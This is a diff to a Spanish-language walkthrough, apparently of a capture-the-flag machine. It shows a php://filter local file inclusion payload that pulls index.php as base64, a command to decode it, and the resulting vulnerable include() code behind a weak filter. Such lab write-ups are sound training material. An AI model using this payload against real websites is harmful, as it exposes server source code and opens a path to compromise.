@@ -156,6 +156,17 @@ Dándonos como resultado el código `php` del `admin.php`
 ?>
 ```
 
+También sabemos que tenemos el archivo `index` así que vamos a hacer la enumeración del código igual que hemos hecho con `admin`
+```php
+?page=php://filter/convert.base64-encode/resource=index
+```
 
+Decodeamos de nuevo el *base64*
+```shell
+echo -n 'PGI+VGhpcyBpcyBvbmx5IGZvciBkZXZlbG9wZXJzPC9iPgo8YnI+CjxhIGhyZWY9Ij9wYWdlPWFkbWluIj5BZG1pbiBQYW5lbDwvYT4KPD9waHAKCWRlZmluZSgiRElSRUNUQUNDRVNTIixmYWxzZSk7CgkkcGFnZT0kX0dFVFsncGFnZSddOwoJaWYoJHBhZ2UgJiYgIXByZWdfbWF0Y2goIi9iaW58dXNyfGhvbWV8dmFyfGV0Yy9pIiwkcGFnZSkpewoJCWluY2x1ZGUoJF9HRVRbJ3BhZ2UnXSAuICIucGhwIik7Cgl9ZWxzZXsKCQlpbmNsdWRlKCJjaGVja2VyLnBocCIpOwoJfQkKPz4K' | base64 -d; echo
+```
+
+Obteniendo el mismo contenido que ya conocíamos del `index.php`
+Sabemos que existe el directorio `/uploads` que parte directamente desde la raiz del servicio web.
 
 
